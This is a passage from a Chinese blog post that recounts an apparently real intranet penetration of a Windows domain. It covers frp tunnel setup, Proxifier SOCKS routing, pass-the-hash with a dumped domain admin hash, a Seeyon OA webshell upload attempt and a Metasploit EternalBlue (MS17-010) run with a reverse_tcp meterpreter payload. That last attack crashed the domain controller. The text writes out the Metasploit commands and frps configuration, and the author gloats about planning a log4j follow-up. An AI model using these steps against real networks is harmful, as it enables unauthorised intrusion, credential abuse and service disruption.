<p>上传frps相关文件到vps，并执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 frps</span><br><span class="line">或</span><br><span class="line">chmod +x frps</span><br><span class="line">赋予frps执行权限</span><br></pre></td></tr></table></figure>

<p>frps.ini配置如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr &#x3D; 0.0.0.0</span><br><span class="line">dashboard_user &#x3D; user</span><br><span class="line">dashboard_pwd &#x3D; pass</span><br><span class="line">dashboard_port &#x3D; 7500</span><br><span class="line">bind_port &#x3D; 7000</span><br></pre></td></tr></table></figure>

<p>访问vps:7500输入frps.ini中的user和pwd可以看到图形页面<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/21.png" alt="21"><br>client显示为1即连接正常</p>
<p>vps执行./frps<br>目标机执行frpc.exe<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/22.png" alt="22"><br>成功建立连接</p>
<h2 id="0x08内网横向"><a href="#0x08内网横向" class="headerlink" title="0x08内网横向"></a>0x08内网横向</h2><p>使用proxifier，让工具流量走sock代理<br>proxifier设置<br>1、proxy servers设置<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/23.png" alt="23"><br>2、proxification rules设置<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/24.png" alt="24"><br>把需要走sock代理的工具添加到列表中即可</p>
<p>前面我们已经获取到域管用户nicole的密码hash<br>直接psexec hash传递</p>
<p>这里提一下<br>哈希传递攻击适用情况：</p>
<p>在工作组环境中：<br>Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。<br>Windows Vista 之后的机器，只能是administrator用户的哈希值才能进行哈希传递攻击，其他用户(包括管理员用户但是非administrator)也不能使用哈希传递攻击，会提示拒绝访问。</p>
<p>在域环境中：<br>只能是域管理员组内用户(可以是域管理员组内非administrator用户)的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/25.png" alt="25"><br>不对劲，空密码不是这个报错<br>难到dump下来的hash不对?<br>连接起来之前得到的信息，冷静分析一波，一切都明朗了<br>我这台机器很有可能是dc备份，域控就是253，dump下来的hash没错，但是极有可能是旧的<br>看来还是回到起点，重新搞域控</p>
<p>goby设置代理<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/26.png" alt="26"><br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/27.png" alt="27"><br>浏览器挂上代理，域控8090开的致远oa，其他页面啥也不是、<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/28.png" alt="28"><br>几乎没有任何思考<br>访问<a href="http://192.168.0.253:8090/seeyon/SeeyonUpdate1.jspx" target="_blank" rel="noopener">http://192.168.0.253:8090/seeyon/SeeyonUpdate1.jspx</a><br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/29.png" alt="29"><br>寄、<br>没有出现java.lang.NullPointerException:null<br>但是抱着试一试的态度测试一下上传</p>
<p>1、burp添加socks代理<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/30.png" alt="30"><br>2、构造payload包发送<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/31.png" alt="31"><br>3、访问shell地址<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/32.png" alt="32"><br>404了，显然没有成功。<br>这里有必要说一下，我在这个域内的时候log4j远程代码执行这个核弹级漏洞还没被爆出来，否则也就没后边那么多弯弯绕了</p>
<p><strong>ms17-010</strong><br>goby扫到253开的还有445，并且存在ms-17010,那自然是要试一试</p>
<p>首先在cs上创建一个msf监听器<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/33.png" alt="33"><br>然后msf开启监听，cs增加会话选择刚才创建的msf监听器<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/34.png" alt="34"><br>msf建立连接</p>
<p>添加路由<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/35.png" alt="35"><br>后台会话，利用17010横向<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/36.png" alt="36"><br>这里的第二个和第三个模块需要目标开启命名管道，并且比较稳定。第一个模块只要存在漏洞即可，但是会有概率把目标打蓝屏，而且杀软拦截也会比较严格，如果有杀软就基本可以放弃这个模块了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue&#x2F;&#x2F;加载漏洞模块</span><br><span class="line">Show options&#x2F;&#x2F;查看需要填写的参数</span><br><span class="line">Set rhost 目标IP</span><br><span class="line">Set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/37.png" alt="37"><br>wo_ri<br>本来保险起见我msf打域控的时候，我webshell这边也一直在ping域控探测主机在线情况，结果还真给它打蓝屏重启了</p>
<p>等了几分钟域控重新在线，但是web服务没再起<br>然后又爆破了一波3389无果、<br>暂时就搁置了</p>
<p>寄希望于他们能重启web服务，让我用log4j风靡一番，有后续再写</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="https://github.com/MzzdToT" target="_blank" rel="noopener">项目</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01前言"><span class="toc-number">1.</span> <span class="toc-text">0x01前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02背景"><span class="toc-number">2.</span> <span class="toc-text">0x02背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03上传文件"><span class="toc-number">3.</span> <span class="toc-text">0x03上传文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04木马免杀"><span class="toc-number">4.</span> <span class="toc-text">0x04木马免杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05权限维持"><span class="toc-number">5.</span> <span class="toc-text">0x05权限维持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06内网信息收集"><span class="toc-number">6.</span> <span class="toc-text">0x06内网信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07内网穿透"><span class="toc-number">7.</span> <span class="toc-text">0x07内网穿透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08内网横向"><span class="toc-number">8.</span> <span class="toc-text">0x08内网横向</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://mzzdtot.github.io/2021/12/11/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://mzzdtot.github.io/2021/12/11/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&text=内网|初探内网渗透(一)" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://mzzdtot.github.io/2021/12/11/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&title=内网|初探内网渗透(一)" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://mzzdtot.github.io/2021/12/11/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&is_video=false&description=内网|初探内网渗透(一)" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=内网|初探内网渗透(一)&body=Check out this article: https://mzzdtot.github.io/2021/12/11/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://mzzdtot.github.io/2021/12/11/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&title=内网|初探内网渗透(一)" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://mzzdtot.github.io/2021/12/11/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&title=内网|初探内网渗透(一)" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://mzzdtot.github.io/2021/12/11/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&title=内网|初探内网渗透(一)" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://mzzdtot.github.io/2021/12/11/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&title=内网|初探内网渗透(一)" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://mzzdtot.github.io/2021/12/11/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&name=内网|初探内网渗透(一)&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://mzzdtot.github.io/2021/12/11/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&t=内网|初探内网渗透(一)" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2021
    作者
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="https://github.com/MzzdToT" target="_blank" rel="noopener">项目</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
